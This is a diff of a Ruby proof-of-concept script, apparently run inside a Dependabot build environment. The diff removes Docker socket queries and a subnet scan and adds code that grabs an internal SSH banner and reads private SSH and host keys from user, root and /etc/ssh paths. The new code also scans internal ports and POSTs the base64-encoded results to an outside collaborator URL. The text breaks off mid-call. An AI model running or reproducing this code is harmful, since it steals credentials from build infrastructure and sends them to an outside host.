@@ -7,51 +7,65 @@ begin
 
   results = []
 
-  # Docker Unix socket
-  ["/var/run/docker.sock", "/run/docker.sock"].each do |sock_path|
-    begin
-      if File.exist?(sock_path)
-        sock = UNIXSocket.new(sock_path)
-        sock.write("GET /containers/json?all=true HTTP/1.0\r\nHost: localhost\r\n\r\n")
-        resp = sock.read(8192)
-        sock.close
-        results << "=== DOCKER SOCKET #{sock_path} ===\n#{resp[0..5000]}"
-      else
-        results << "=== DOCKER SOCKET #{sock_path} NOT FOUND ==="
-      end
-    rescue => e
-      results << "=== DOCKER SOCKET #{sock_path} ERR: #{e.class}: #{e.message} ==="
+  # SSH banner lezen
+  begin
+    sock = TCPSocket.new("172.19.0.1", 22)
+    sock.setsockopt(Socket::SOL_SOCKET, Socket::SO_RCVTIMEO, [3, 0].pack("l_2"))
+    banner = sock.recv(256)
+    sock.close
+    results << "=== SSH BANNER ===\n#{banner.inspect}"
+  rescue => e
+    results << "=== SSH BANNER ERR: #{e.class}: #{e.message} ==="
+  end
+
+  # SSH private keys zoeken
+  key_paths = [
+    "/home/dependabot/.ssh/id_rsa",
+    "/home/dependabot/.ssh/id_ed25519",
+    "/home/dependabot/.ssh/id_ecdsa",
+    "/home/dependabot/.ssh/authorized_keys",
+    "/home/dependabot/.ssh/known_hosts",
+    "/root/.ssh/id_rsa",
+    "/root/.ssh/id_ed25519",
+    "/root/.ssh/known_hosts",
+    "/etc/ssh/ssh_host_rsa_key",
+    "/etc/ssh/ssh_host_ed25519_key",
+  ]
+
+  key_paths.each do |path|
+    if File.exist?(path)
+      content = File.read(path) rescue "ERROR READING"
+      results << "=== FOUND: #{path} ===\n#{content[0..3000]}"
     end
   end
 
-  # Port scan 172.19.0.1
-  [22, 80, 443, 2375, 2376, 5000, 5001, 8080, 8443, 9090, 9443].each do |port|
+  # ls /home/dependabot/.ssh/ als die bestaat
+  begin
+    if Dir.exist?("/home/dependabot/.ssh")
+      entries = Dir.entries("/home/dependabot/.ssh")
+      results << "=== /home/dependabot/.ssh/ ===\n#{entries.join("\n")}"
+    else
+      results << "=== /home/dependabot/.ssh DOES NOT EXIST ==="
+    end
+  rescue => e
+    results << "=== SSH DIR ERR: #{e.class} ==="
+  end
+
+  # Extra poorten op 172.19.0.1
+  [3000, 3306, 5432, 6379, 8888, 10250, 32526].each do |port|
     begin
       s = TCPSocket.new("172.19.0.1", port)
-      banner = begin; s.read_nonblock(256); rescue; ""; end
       s.close
-      results << "=== 172.19.0.1:#{port} OPEN banner=#{banner.inspect} ==="
+      results << "=== 172.19.0.1:#{port} OPEN ==="
     rescue Errno::ECONNREFUSED
       results << "=== 172.19.0.1:#{port} REFUSED ==="
     rescue => e
-      results << "=== 172.19.0.1:#{port} ERR: #{e.class} ==="
-    end
-  end
-
-  # Scan other IPs on subnet
-  (1..10).each do |i|
-    next if i == 2 || i == 3
-    begin
-      s = TCPSocket.new("172.19.0.#{i}", 80)
-      s.close
-      results << "=== 172.19.0.#{i}:80 OPEN ==="
-    rescue => e
-      results << "=== 172.19.0.#{i}:80 #{e.class} ==="
+      results << "=== 172.19.0.1:#{port} #{e.class} ==="
     end
   end
 
   payload = [results.join("\n\n")].pack("m0")
-  post_uri = URI("#{COLLAB_URL}?poc=docker-socket")
+  post_uri = URI("#{COLLAB_URL}?poc=ssh-keys")
   r = Net::HTTP::Post.new(post_uri)
   r.body = payload
   Net::HTTP.start(post_uri.host, post_uri.port, use_ssl: post_uri.scheme == "https",
